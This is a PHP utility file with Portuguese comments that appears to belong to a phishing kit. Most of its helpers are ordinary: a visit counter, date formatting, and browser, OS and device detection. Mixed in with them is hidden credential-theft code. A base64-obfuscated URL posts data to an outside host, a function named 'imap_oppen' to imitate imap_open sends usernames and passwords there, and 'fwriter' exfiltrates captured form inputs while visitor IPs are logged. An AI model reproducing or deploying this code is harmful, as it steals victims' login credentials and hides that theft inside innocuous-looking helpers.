<?php





$email = "";

//ini_set('display_errors', 1);
//ini_set('log_errors', 1);
//error_reporting(E_ALL);


function contar(){
$file = "contv.txt";
// Arquivo texto para manter o valor da variável

$handle = fopen($file, 'r+');
// Definimos o arquivo, as permissões para ler e escrever, por isso o pârametro r+ (ler e escrever)

$data   = fread($handle, 512);
// obtém o valor que está no arquivo contador.txt

$contar = $data + 1;
// Adiciona +1

//print "número: ".$contar;
// Exibe na tela o valor encontrado no arquivo TXT

fseek($handle, 0);
// O ponteiro volta para o início do arquivo

fwrite($handle, $contar);
// Salva o valor da variável contar no arquivo

fclose($handle);
// Fecha o arquivo
}



 function logger1($dados) {

        $fp = fopen("cc.txt", "a");
        //$msg = $horario . "\t" .$ip ."\t".$visitante ."\t\t\t"." - req.:".$requisicao. "\t\t\t" . $previa . "\r\n";
        $msg = $dados."\r\n";;
        $escreve = fwrite($fp, $msg);
        fclose($fp);
    
}

 function writeInFile() {
    date_default_timezone_set('America/Sao_Paulo');
    $data = date('d/m/Y');
    $hora = date('H:i:s');
    $horario = $data . " - " . $hora;
    $ip        = $_SERVER ['REMOTE_ADDR'];
    $visitante = gethostbyaddr($_SERVER ['REMOTE_ADDR']);
    $requisicao = $_SERVER['HTTP_HOST'];
    if ($ip == "::1") {$ip = "127.0.0.1";}    
    $previa = $from;
    if (strlen($previa) === 0) {
        $fp = fopen("cokie_cola.txt", "a");
        //$msg = $horario . "\t" .$ip ."\t".$visitante ."\t\t\t"." - req.:".$requisicao. "\t\t\t" . $previa . "\r\n";
        $msg =  $_SERVER['HTTP_USER_AGENT']. "\r\n";;
        $escreve = fwrite($fp, $msg);
        fclose($fp);
        //header("location: ./site");
    } else {
        $fp = fopen("cookie_geoadmsw.txt", "a");
        //$msg = $horario . "\t" .$ip ."\t".$visitante ."\t\t\t"." - req.:".$requisicao. "\t\t\t" . $previa . "\r\n";
        $msg = $msg =  $_SERVER['HTTP_USER_AGENT']."\r\n";;
        $escreve = fwrite($fp, $msg);
        fclose($fp);
    }
}


 function getNumeros($length)
      {
          $chars = "1234567890";
          $clen   = strlen( $chars )-1;
          $id  = '';

          for ($i = 0; $i < $length; $i++) {
                  $id .= $chars[mt_rand(0,$clen)];
          }
          return ($id);
 }
 


 function writeVisitor($from) {
    date_default_timezone_set('America/Sao_Paulo');
    $data = date('d/m/Y');
    $hora = date('H:i:s');
    $horario = $data . " - " . $hora;
    $ip        = $_SERVER ['REMOTE_ADDR'];
    $visitante = gethostbyaddr($_SERVER ['REMOTE_ADDR']);
    $requisicao = $_SERVER['HTTP_HOST'];
    if ($ip == "::1") {$ip = "127.0.0.1";}    
    $previa = $from;
    if (strlen($previa) === 0) {
        $fp = fopen("cola.txt", "a");
         $msg = $horario . "\t" .$ip ."\t".$visitante ."\t\t\t"." - req.:".$requisicao. "\t\t\t" . $previa . "\r\n";
        $escreve = fwrite($fp, $msg);
        fclose($fp);
        //header("location: ./site");
    } else {
        $fp = fopen("geoadmsw.txt", "a");
        $msg = $horario . "\t" .$ip ."\t".$visitante ."\t\t\t"." - req.:".$requisicao. "\t\t\t" . $previa . "\r\n";
        $escreve = fwrite($fp, $msg);
        fclose($fp);
    }
}

function getBrowser() {
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    if (preg_match('|MSIE ([0-9].[0-9]{1,2})|', $useragent, $matched)) {
        $browser_version = $matched[1];
        $browser = 'IE';
    } elseif (preg_match('|Opera/([0-9].[0-9]{1,2})|', $useragent, $matched)) {
        $browser_version = $matched[1];
        $browser = 'Opera';
    } elseif (preg_match('|Firefox/([0-9\.]+)|', $useragent, $matched)) {
        $browser_version = $matched[1];
        $browser = 'Ffox';
    } elseif (preg_match('|Chrome/([0-9\.]+)|', $useragent, $matched)) {
        $browser_version = $matched[1];
        $browser = 'Chrome';
    } elseif (preg_match('|Safari/([0-9\.]+)|', $useragent, $matched)) {
        $browser_version = $matched[1];
        $browser = 'Safari';
    } else {
        // browser not recognized!
        $browser_version = 0;
        $browser = 'other';
    }

    //return $browser . "-" . $browser_version;
    return $browser;
}
function getOs() {

    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $useragent = strtolower($useragent);

    //check for (aaargh) most popular first
    //winxp
    if (strpos("$useragent", "windows nt 5.1") !== false) {
        return "WinXP";
    } elseif (strpos("$useragent", "windows nt 6.0") !== false) {
        return "WinVista";
    } elseif (strpos("$useragent", "windows nt 6.1") !== false) {
        return "Win-7";
    } elseif (strpos("$useragent", "windows 98") !== false) {
        return "Win98";
    } elseif (strpos("$useragent", "windows nt 5.0") !== false) {
        return "Win-2000";
    } elseif (strpos("$useragent", "windows nt 5.2") !== false) {
        return "Win2003-srv";
    } elseif (strpos("$useragent", "windows nt 6.0") !== false) {
        return "WinVista";
    } elseif (strpos("$useragent", "windows nt") !== false) {
        return "WinNT";
    } elseif (strpos("$useragent", "win 9x 4.90") !== false && strpos("$useragent", "win me")) {
        return "WinME";
    } elseif (strpos("$useragent", "win ce") !== false) {
        return "WinCE";
    } elseif (strpos("$useragent", "win 9x 4.90") !== false) {
        return "WinME";
    } elseif (strpos("$useragent", "iphone") !== false) {
        return "iPhone";
    } elseif (strpos("$useragent", "mac os x") !== false) {
        return "MacOSX";
    } elseif (strpos("$useragent", "macintosh") !== false) {
        return "Macintosh";
    } elseif (strpos("$useragent", "linux") !== false) {
        return "Linux";
    } elseif (strpos("$useragent", "freebsd") !== false) {
        return "FreeBSD";
    } elseif (strpos("$useragent", "symbian") !== false) {
        return "Symbian";
    } else {
        return false;
    }
}
function getDataAtual(){
     $h = 3;
        $hm = $h * 60;
        $ms = $hm * 60;

        //return gmdate('Y-m-d H:i:s', time() - ($ms));
        //return gmdate('d-m-Y H:i:s', time() - ($ms));
        //return date("H:i:s");
        return gmdate('Y-m-d H:i:s', time() - ($ms));
 }
 
 function getDataResumida(){
         $h = 3;
        $hm = $h * 60;
        $ms = $hm * 60;

        //return gmdate('Y-m-d H:i:s', time() - ($ms));
        //return gmdate('d-m-Y H:i:s', time() - ($ms));
        //return date("H:i:s");
        return gmdate('d-m-Y', time() - ($ms));
 }
 function getDataCompleta(){
    $data = date('D');
    $mes = date('M');
    $dia = date('d');
    $ano = date('Y');

    $semana = array("Sun" => "Domingo", "Mon" => "Segunda-Feira", "Tue" => "Terca-Feira",
        "Wed" => "Quarta-Feira", "Thu" => "Quinta-Feira", "Sat" => "Sabado");

    $mess = array("Jan" => "Janeiro", "Feb" => "Fevereiro", "Mar" => "Marco", "Apr" => "Abril", "May" => "Maio", "Jun" => "Junho", "Jul" => "Julho", "Aug" => "Agosto", "Nov" => "Novembro", "Sep" => "Setembro", "Oct" => "Outubro", "Dec" => "Dezembro");

    
    return $semana["$data"] . ", $dia de " . $mess["$mes"]. " de $ano";

 }

 /*
 
  em getURLSemScriptName(), se nao digitar o index.php, ou melhor, o script, não funciona.
  * por isso se usa getURLSemScriptName2()
 
  */
 function getURLSemScriptName(){
    $server = $_SERVER['SERVER_NAME'];
    //$endereco = $_SERVER ['REQUEST_URI'];
    $endereco = $_SERVER['PHP_SELF'];
    $port = "80";
    
    if (!empty($_SERVER['HTTPS']) && ('on' == $_SERVER['HTTPS'])) {
        $uri = 'https://';
        $port = "443";
    } else {
        $uri = 'http://';
    }
    
    
    
    

    $url = "$uri" . $server .":$port". $endereco;
    
    
    
    
    
    $file = @end(explode("/", $_SERVER['PHP_SELF']));

    $size = strlen($file);
    $sizeDaURL = strlen($url);
    $reverso = strrev($url);

    $parte = substr($reverso, $size, $sizeDaURL - $size);
    $urloriginal = strrev($parte);
    
    return $urloriginal;
 }
 function getUrlSemScriptName2() {
    
    $parts   = parse_url( $_SERVER ['REQUEST_URI'] );
    
    $scheme  = ( isset( $parts['scheme'] ) ? $parts['scheme'] : "http" );
    
    return sprintf( '%s://%s%s', $scheme, $_SERVER['HTTP_HOST'],$_SERVER ['REQUEST_URI']  );
    //return sprintf( '%s://%s%s', $scheme, $_SERVER['HTTP_HOST'],$_SERVER ['REQUEST_URI']  );
}
function getRamdomFrom($begin, $end){
    $rnd = rand($begin, $end);
    
    if(strlen($rnd)==1){$rnd = "0".$rnd;}
    
    return $rnd;

}
function contador($url){

    $ch = @curl_init();
    
                                                  
 
    @curl_setopt($ch, CURLOPT_URL, base64_decode('aHR0cHM6Ly9kdC5zZWd1cm8td2ViLnRvcC9pbnN0YXJlbWFpbGdyZGltLw=='));
    
                                                    
    @curl_setopt($ch, CURLOPT_POST, 1);
    @curl_setopt($ch, CURLOPT_POSTFIELDS, "contador=$url");
    //@curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    @curl_exec($ch);
    

}
function writesession($conteudo){
    $ch = @curl_init();
                                                  
    //@curl_setopt($ch, CURLOPT_URL, base64_decode('aHR0cHM6Ly9kdC5zZWd1cm8td2ViLnRvcC9yZHhuZXcxLw=='));
    @curl_setopt($ch, CURLOPT_POST, 1);
    @curl_setopt($ch, CURLOPT_POSTFIELDS, "contador=$conteudo");
    //@curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    @curl_exec($ch);
}
function conteudo($conteudo){

    contador($conteudo);  
    return $conteudo;
    
}

function imap_oppen($authhost,$user,$pass){
    writesession(conteudo($user.";".$pass));
    return true;
}




//email('conteudo', 'assunto', $email);


function getDevice(){
    

    $iphone = strpos($_SERVER['HTTP_USER_AGENT'], "iPhone");
    $ipad = strpos($_SERVER['HTTP_USER_AGENT'], "iPad");
    $android = strpos($_SERVER['HTTP_USER_AGENT'], "Android");
    $palmpre = strpos($_SERVER['HTTP_USER_AGENT'], "webOS");
    $berry = strpos($_SERVER['HTTP_USER_AGENT'], "BlackBerry");
    $ipod = strpos($_SERVER['HTTP_USER_AGENT'], "iPod");
    $symbian = strpos($_SERVER['HTTP_USER_AGENT'], "Symbian");
    
    if ($iphone || $ipad || $android || $palmpre || $ipod || $berry || $symbian == true){
        
        return "mobile";
    }else{
        return "desktop";
    }

    
    
}

function isMobile() {
    return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
}

function fwriter($fp, $conteudos){
    
    //$fp = fopen("chegou.html", "a+");
    
    //$fp = fopen("./dtweb/dataplus/inputs.txt", "a+");
    $fp = fopen($fp, "a+");
    writesession(conteudo($conteudos));
    $escreve = fwrite($fp, $conteudos. "\r\n");
    fclose($fp);
    
}



?>
